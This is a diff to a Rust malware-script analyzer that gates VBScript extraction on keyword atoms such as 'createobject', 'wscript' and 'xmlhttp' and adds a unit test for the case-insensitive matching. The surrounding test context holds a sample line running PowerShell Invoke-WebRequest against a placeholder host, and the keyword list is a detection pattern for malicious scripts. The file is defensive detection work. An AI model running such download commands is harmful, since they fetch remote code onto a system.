@@ -4370,6 +4370,13 @@ fn push_unique_payload(payloads: &mut Vec<Vec<u8>>, payload: Vec<u8>) {
     }
 }
 
+fn contains_ascii_case_insensitive_bytes(haystack: &[u8], needle: &[u8]) -> bool {
+    !needle.is_empty()
+        && haystack
+            .windows(needle.len())
+            .any(|window| window.eq_ignore_ascii_case(needle))
+}
+
 fn looks_like_vbs_script(lower: &str) -> bool {
     lower.contains("createobject")
         || lower.contains("wscript")
@@ -4434,15 +4441,15 @@ fn starts_like_standalone_vbs(lower: &str) -> bool {
 }
 
 fn pre_scan_standalone_script_input(input: &[u8], env: &mut Environment) -> bool {
-    let text = String::from_utf8_lossy(input);
-    let has_vbs_atom = crate::util::contains_ascii_case_insensitive(&text, "createobject")
-        || crate::util::contains_ascii_case_insensitive(&text, "wscript")
-        || crate::util::contains_ascii_case_insensitive(&text, "xmlhttp")
-        || crate::util::contains_ascii_case_insensitive(&text, "option explicit");
+    let has_vbs_atom = contains_ascii_case_insensitive_bytes(input, b"createobject")
+        || contains_ascii_case_insensitive_bytes(input, b"wscript")
+        || contains_ascii_case_insensitive_bytes(input, b"xmlhttp")
+        || contains_ascii_case_insensitive_bytes(input, b"option explicit");
     if !has_vbs_atom {
         return false;
     }
 
+    let text = String::from_utf8_lossy(input);
     let lower = text.to_ascii_lowercase();
     if starts_like_standalone_vbs(&lower) && looks_like_vbs_script(&lower) {
         push_unique_payload(&mut env.all_extracted_vbs, text.as_bytes().to_vec());
@@ -17154,6 +17161,22 @@ sh.Run("powershell -Command Invoke-WebRequest https://direct-js.example/p")"#,
             env.all_extracted_jscript.len(),
             env.all_extracted_vbs.len()
         );
+    }
+
+    #[test]
+    fn standalone_script_prescan_byte_gate_matches_mixed_case_atoms() {
+        assert!(crate::contains_ascii_case_insensitive_bytes(
+            b"Dim x\r\nSet x = CREATEOBJECT(\"WScript.Shell\")",
+            b"createobject"
+        ));
+        assert!(crate::contains_ascii_case_insensitive_bytes(
+            b"Set x = CreateObject(\"MSXML2.XMLHTTP\")",
+            b"xmlhttp"
+        ));
+        assert!(!crate::contains_ascii_case_insensitive_bytes(
+            b"echo just a batch file",
+            b"createobject"
+        ));
     }
 
     #[test]
